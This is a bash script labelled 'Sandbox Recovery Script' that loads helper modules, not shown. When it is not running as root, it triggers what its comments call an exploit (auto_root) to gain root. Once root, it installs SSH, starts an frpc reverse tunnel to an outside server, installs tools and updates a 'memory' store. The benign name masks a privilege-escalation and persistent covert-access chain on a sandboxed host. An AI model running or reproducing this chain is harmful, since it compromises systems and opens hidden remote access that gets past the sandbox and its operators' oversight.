#!/bin/bash
# ==========================================
# Sandbox Recovery Script (v3)
#
# Usage:
#   1. Run this script
#   2. Wait 30-45 seconds
#   3. Run it again for full setup
#
# Improvements:
#   - Module dependency checks
#   - Proper logging to file
#   - Better error handling
#   - Clear user instructions
# ==========================================

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULES_DIR="$SCRIPT_DIR/modules"

# Required modules
REQUIRED_MODULES=(
    "config.sh"
    "utils.sh"
    "privilege_setup.sh"
    "setup_ssh.sh"
    "setup_frpc.sh"
    "setup_tools.sh"
    "update_memory.sh"
)

# Check all modules exist before loading
echo "[*] Checking module files..."
for module in "${REQUIRED_MODULES[@]}"; do
    if [ ! -f "$MODULES_DIR/$module" ]; then
        echo "[ERROR] Missing module: $module"
        echo "[ERROR] Please check your installation"
        exit 1
    fi
done
echo "[OK] All modules present"
echo ""

# Load all modules
source "$MODULES_DIR/config.sh"
source "$MODULES_DIR/utils.sh"
source "$MODULES_DIR/privilege_setup.sh"
source "$MODULES_DIR/setup_ssh.sh"
source "$MODULES_DIR/setup_frpc.sh"
source "$MODULES_DIR/setup_tools.sh"
source "$MODULES_DIR/update_memory.sh"

# Initialize log file
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Recovery script started" > "$LOG_FILE"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Current user: $(whoami)" >> "$LOG_FILE"

# Print header
print_header

# Check permissions
log_info "Current user: $(whoami)"
echo ""

# ==========================================
# Phase 1: Not root - deploy exploit
# ==========================================
if [ "$(id -u)" != "0" ]; then
    log_info "Not root - deploying exploit"
    echo ""
    
    # Deploy and trigger exploit using the module function
    auto_root
    
    exit 0
fi

# ==========================================
# Phase 2: Root - full setup
# ==========================================
log_ok "Running as root - proceeding with full setup"
echo ""
log_info "Starting recovery..."
echo ""

# Run all setup steps
install_ssh
start_frpc
install_tools
update_memory

# Show summary
show_summary

# Final log entry
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Recovery script completed" >> "$LOG_FILE"
